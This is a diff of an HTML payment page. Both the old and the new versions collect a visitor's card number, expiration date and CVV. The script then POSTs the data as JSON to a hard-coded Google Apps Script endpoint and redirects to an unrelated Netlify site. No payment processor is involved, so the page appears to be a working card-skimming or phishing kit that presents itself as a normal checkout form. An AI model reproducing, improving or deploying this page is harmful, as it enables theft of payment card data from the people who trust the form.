@@ -3,90 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Page</title>
-   
+    <title>Payment Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        form {
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            background: #5cb85c;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background: #4cae4c;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Payment Information</h1>
-        <form id="payment-form">
-            <div class="form-group">
-                <label for="card-number">Card Number</label>
-                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
-            </div>
-            <div class="form-group">
-                <label for="exp-month">Expiration Month</label>
-                <select id="exp-month" name="exp-month" required>
-                    <option value="" disabled selected>Select Month</option>
-                    <option value="01">01</option>
-                    <option value="02">02</option>
-                    <option value="03">03</option>
-                    <option value="04">04</option>
-                    <option value="05">05</option>
-                    <option value="06">06</option>
-                    <option value="07">07</option>
-                    <option value="08">08</option>
-                    <option value="09">09</option>
-                    <option value="10">10</option>
-                    <option value="11">11</option>
-                    <option value="12">12</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label for="exp-year">Expiration Year</label>
-                <select id="exp-year" name="exp-year" required>
-                    <option value="" disabled selected>Select Year</option>
-                    <option value="2023">2023</option>
-                    <option value="2024">2024</option>
-                    <option value="2025">2025</option>
-                    <option value="2026">2026</option>
-                    <option value="2027">2027</option>
-                    <option value="2028">2028</option>
-                    <option value="2029">2029</option>
-                    <option value="2030">2030</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label for="cvv">CVV</label>
-                <input type="text" id="cvv" name="cvv" placeholder="123" required>
-            </div>
-            <button type="submit" class="submit-button">Submit Payment</button>
-        </form>
-    </div>
 
-   <script>
-    document.getElementById('payment-form').addEventListener('submit', function(event) {
+<h2>Payment Details</h2>
+<form id="paymentForm">
+    <label for="cardNumber">Card Number:</label>
+    <input type="text" id="cardNumber" name="cardNumber" required>
+
+    <label for="expMonth">Expiration Month:</label>
+    <input type="text" id="expMonth" name="expMonth" required>
+
+    <label for="expYear">Expiration Year:</label>
+    <input type="text" id="expYear" name="expYear" required>
+
+    <label for="cvv">CVV:</label>
+    <input type="text" id="cvv" name="cvv" required>
+
+    <input type="submit" value="Submit">
+</form>
+
+<script>
+    document.getElementById('paymentForm').addEventListener('submit', function(event) {
         event.preventDefault();
-        const cardNumber = document.getElementById('card-number').value;
-        const expMonth = document.getElementById('exp-month').value;
-        const expYear = document.getElementById('exp-year').value;
+
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expMonth = document.getElementById('expMonth').value;
+        const expYear = document.getElementById('expYear').value;
         const cvv = document.getElementById('cvv').value;
 
-        fetch('https://script.google.com/macros/s/AKfycbwDOS2wZZNXN5MA44UUV2Y_LxDQmOPhh86YO6Rk5bxEzmWUP7B60rx-dQERsVEP_Hfc/exec', { // Replace with your web app URL
+        fetch('https://script.google.com/macros/s/AKfycbwDOS2wZZNXN5MA44UUV2Y_LxDQmOPhh86YO6Rk5bxEzmWUP7B60rx-dQERsVEP_Hfc/exec', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify({
-                cardNumber: cardNumber,
-                expMonth: expMonth,
-                expYear: expYear,
-                cvv: cvv
-            })
+            body: JSON.stringify({ cardNumber, expMonth, expYear, cvv })
         })
-        .then(response => response.json())
+        .then(response => response.text())
         .then(data => {
-            if (data.result === "Success") {
-                // Redirect to another site after successful submission
-                window.location.href = "https://melodic-puppy-430091.netlify.app"; // Replace with your desired URL
-            } else {
-                console.error("Error submitting payment information.");
-            }
+            console.log(data);
+            // Redirect to another site after successful submission
+            window.location.href = "https://melodic-puppy-430091.netlify.app"; // Change to your desired URL
         })
-        .catch(error => {
-            console.error('Error:', error);
-        });
+        .catch(error => console.error('Error:', error));
     });
 </script>
+
 </body>
 </html>
